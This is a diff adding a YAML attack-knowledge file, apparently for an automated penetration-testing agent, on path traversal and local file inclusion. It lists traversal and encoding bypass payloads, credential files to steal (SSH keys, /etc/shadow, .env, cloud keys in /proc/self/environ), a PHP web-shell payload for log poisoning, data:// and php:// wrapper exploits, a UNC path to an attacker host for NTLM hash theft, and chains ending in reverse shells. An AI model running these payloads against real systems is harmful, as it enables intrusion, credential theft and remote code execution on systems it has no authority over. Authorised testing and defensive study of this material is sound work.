@@ -1,0 +1,180 @@
+name: path_traversal
+description: Path traversal and local file inclusion — directory escape, filter bypass, and LFI-to-RCE escalation
+techniques:
+  - "Directory traversal sequence injection"
+  - "Encoding and null byte filter bypass"
+  - "OS-specific sensitive file targeting"
+  - "LFI to remote code execution escalation"
+  - "Path canonicalization abuse"
+  - "Application configuration file extraction"
+tools:
+  - httpx
+  - nuclei
+  - curl
+  - ffuf
+knowledge: |
+  Path traversal exploits insufficient input validation on file path parameters to access
+  files outside the intended directory. When combined with local file inclusion (LFI), it
+  can escalate from information disclosure to full remote code execution.
+
+  ## Traversal Sequence Arsenal:
+
+  Start simple, escalate encoding when blocked — each variant targets a different filter:
+  - `../` — basic Unix traversal; try 8-12 levels deep (../../../../../../../../etc/passwd)
+  - `..\` — Windows backslash variant
+  - `..%2f` — URL-encoded forward slash; bypasses filters matching literal ../
+  - `..%5c` — URL-encoded backslash for Windows
+  - `%2e%2e%2f` — full URL encoding of ../
+  - `%2e%2e/` — partial encoding; dots encoded, slash literal
+  - `..%252f` — double URL encoding; server decodes once to ..%2f, app decodes to ../
+  - `....//` — double traversal; if filter strips ../ once, ....// becomes ../
+  - `..././` — nested variant; stripping ../ from middle leaves ../
+  - `..;/` — path parameter bypass in Tomcat/Spring (semicolon ends path segment)
+  - `..\../` — mixed separator confusion
+  - `..%c0%af` — overlong UTF-8 encoding of / (IIS, older Java)
+  - `..%ef%bc%8f` — fullwidth solidus U+FF0F
+  - `..%c1%9c` — overlong UTF-8 encoding of \ for Windows targets
+
+  When you see a traversal filter, try these in order: encoding variants → double
+  encoding → overlong UTF-8 → nested/recursive bypass → absolute path injection.
+
+  ## Null Byte Injection:
+
+  Effective against systems that use null-terminated strings for file operations:
+  - `../../../etc/passwd%00.png` — null byte truncates extension appended by app
+  - `../../../etc/passwd\0.jpg` — literal null in some contexts
+  - Works on: PHP < 5.3.4, older Java, some C-based CGI
+  - Also try: `%2500` (double-encoded null), URL-encoded variations
+  - Modern systems (PHP 5.3.4+, recent Java/Python) are generally immune
+
+  ## OS-Specific High-Value Targets:
+
+  Linux/Unix — prioritize files that leak credentials or enable escalation:
+  - `/etc/passwd` — user enumeration, service accounts, shell paths
+  - `/etc/shadow` — password hashes (requires root; confirms traversal depth)
+  - `/etc/hosts` — internal network mapping, hostname resolution
+  - `/proc/self/environ` — environment variables, may contain secrets, DB creds, API keys
+  - `/proc/self/cmdline` — running process arguments, may reveal paths and config
+  - `/proc/self/fd/[0-20]` — open file descriptors; may include log files, sockets
+  - `/home/*/.bash_history` — command history with potential credentials
+  - `/home/*/.ssh/id_rsa` — private SSH keys
+  - `/var/log/apache2/access.log` — for log poisoning escalation
+  - `/var/log/auth.log` — authentication events, may contain submitted passwords
+  - `/tmp/` — world-readable temp files, session data
+
+  Windows targets:
+  - `C:\Windows\win.ini` — classic traversal confirmation
+  - `C:\boot.ini` — older Windows; confirms traversal on legacy systems
+  - `C:\Windows\System32\drivers\etc\hosts` — network configuration
+  - `C:\inetpub\wwwroot\web.config` — IIS config with connection strings
+  - `C:\Users\*\.ssh\id_rsa` — SSH keys on Windows
+  - `C:\ProgramData\` — application data, often world-readable
+
+  ## Application-Specific Targets:
+
+  When you identify the framework, target its configuration files:
+  - **PHP**: `config.php`, `wp-config.php`, `.env`, `database.php`
+  - **Python/Django**: `settings.py`, `.env`, `local_settings.py`
+  - **Ruby/Rails**: `database.yml`, `secrets.yml`, `credentials.yml.enc`, `master.key`
+  - **Node.js**: `.env`, `config.json`, `package.json` (dependency info)
+  - **Java**: `application.properties`, `application.yml`, `web.xml`, `persistence.xml`
+  - **ASP.NET**: `web.config`, `appsettings.json`, `connectionstrings.config`
+  - **General**: `.git/config`, `.git/HEAD`, `.svn/entries`, `docker-compose.yml`
+
+  ## Vulnerable Context Identification:
+
+  Path traversal surfaces in these parameter patterns — test all of them:
+  - **File download**: `?file=report.pdf`, `?doc=invoice.pdf`, `?path=image.jpg`
+  - **Include/template**: `?page=about`, `?template=header`, `?view=dashboard`
+  - **Language/locale**: `?lang=en`, `?locale=fr_FR` (may map to file path)
+  - **Log viewer**: `?logfile=app.log`, `?date=2024-01-01` (date may build path)
+  - **Image serving**: `?img=avatar.png`, `/images?src=photo.jpg`
+  - **Static file serving**: `/static?file=style.css`, `/assets?name=script.js`
+  - **File upload retrieval**: `/uploads?id=user_doc` (may be path-based)
+  - **Backup/export**: `?backup=db_2024`, `?export=users`
+
+  ## Filter Bypass Techniques:
+
+  When basic traversal is blocked, systematically test the filter's weaknesses:
+  - **Single-pass stripping**: Filter removes `../` once → send `....//` which becomes
+    `../` after single strip; or `..././` → `../`
+  - **Absolute path injection**: If filter only blocks `..`, try `/etc/passwd` directly —
+    some apps prepend a base path but don't enforce it
+  - **Path normalization mismatch**: Filter checks raw input but filesystem resolves
+    symlinks and normalizes — `/var/www/../../etc/passwd` may pass filter but resolve
+  - **Mixed encoding**: Combine encoded and literal chars: `..%2f..%2f..%2fetc/passwd`
+  - **Unicode normalization**: Some systems normalize Unicode before file access but
+    filters check pre-normalized input
+  - **UNC paths (Windows)**: `\\attacker.com\share\payload` — server may fetch from
+    external share, leaking NTLM hash or executing remote file
+  - **Backslash on Unix**: Some apps replace `../` but not `..\` — Unix may accept
+    `\` as literal char in filename, but the intent was traversal
+  - **Trailing characters**: `../../../etc/passwd.` or `../../../etc/passwd/` — some
+    systems ignore trailing dot or slash
+
+  ## LFI to RCE Escalation:
+
+  When you have confirmed file read, escalate to code execution:
+  - **Log poisoning**: Inject PHP/code into access log via User-Agent or URL, then
+    include the log file: `<?php system($_GET['cmd']); ?>` in User-Agent →
+    include `/var/log/apache2/access.log`
+  - **PHP wrappers**: `php://filter/convert.base64-encode/resource=config.php` for
+    source read; `php://input` with POST body for execution; `expect://id` for
+    direct command execution (if expect extension loaded)
+  - **Session file inclusion**: PHP sessions stored in `/tmp/sess_[PHPSESSID]` —
+    inject PHP code into session data, then include the session file
+  - **/proc/self/fd poisoning**: If app has open file descriptor to a writable
+    location, inject code via that FD and include via /proc/self/fd/N
+  - **Upload + include**: Upload file with code (bypassing extension check),
+    then include it via traversal to trigger execution
+  - **Temp file inclusion**: Some apps write user input to temp files during
+    processing — race condition to include temp file before cleanup
+  - **data:// wrapper**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`
+    — base64 of `<?php system($_GET['c']); ?>` (requires allow_url_include)
+
+  ## Chaining Patterns:
+
+  Path traversal is often the first link in a longer chain:
+  - **Traversal → source code → hardcoded credentials → database access → full compromise**
+  - **Traversal → .git directory → full source reconstruction → auth bypass**
+  - **Traversal → SSH keys → lateral movement to internal systems**
+  - **Traversal → /proc/self/environ → cloud credentials (AWS_SECRET_ACCESS_KEY) → cloud takeover**
+  - **Traversal → config files → database credentials → SQLi or direct DB access**
+  - **LFI → log poisoning → RCE → reverse shell → privilege escalation**
+  - **Traversal → .env → API keys → third-party service abuse**
+examples:
+  - title: "Basic Directory Traversal"
+    description: "Escape document root to read /etc/passwd"
+    payload: "GET /api/files?path=../../../../../../../../etc/passwd"
+    validation: "Response contains root:x:0:0: confirming traversal success and depth"
+  - title: "Double Encoding Bypass"
+    description: "Bypass WAF or filter using double URL encoding"
+    payload: "GET /download?file=..%252f..%252f..%252f..%252fetc%252fpasswd"
+    validation: "Server decodes %252f to %2f, then to / — check for /etc/passwd content in response"
+  - title: "Null Byte Extension Bypass"
+    description: "Truncate appended extension on older PHP systems"
+    payload: "GET /page.php?template=../../../etc/passwd%00"
+    validation: "If app appends .php to include path, null byte truncates it — passwd content indicates success"
+  - title: "PHP Wrapper Source Code Disclosure"
+    description: "Read PHP source code via filter wrapper to avoid execution"
+    payload: "GET /index.php?page=php://filter/convert.base64-encode/resource=config"
+    validation: "Response contains base64-encoded PHP source; decode to extract database credentials"
+  - title: "Log Poisoning to RCE"
+    description: "Inject PHP into access log via User-Agent, then include log file"
+    payload: "Step 1: curl -A '<?php system($_GET[\"c\"]); ?>' https://target.com/nonexistent  Step 2: GET /index.php?page=../../../var/log/apache2/access.log&c=id"
+    validation: "Response includes command output (uid=www-data) embedded in log file contents"
+  - title: "Windows UNC Path NTLM Theft"
+    description: "Trigger outbound SMB connection to capture NTLM hash"
+    payload: "GET /api/files?path=\\\\attacker-ip\\share\\file.txt"
+    validation: "Check Responder/ntlmrelayx for captured NTLM hash from target server"
+validation_methods:
+  - "Read /etc/passwd (Linux) or C:\\Windows\\win.ini (Windows) as baseline traversal confirmation"
+  - "Use unique canary strings — read a known file with distinctive content to eliminate false positives"
+  - "Compare response length and content-type between valid file request and traversal attempt"
+  - "Attempt traversal at increasing depth (1-12 levels of ../) to determine required escape depth"
+  - "Test both forward slash and backslash variants to identify OS and filter behavior"
+  - "Use php://filter/convert.base64-encode to confirm LFI without triggering code execution"
+references:
+  - "https://owasp.org/www-community/attacks/Path_Traversal"
+  - "https://portswigger.net/web-security/file-path-traversal"
+  - "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
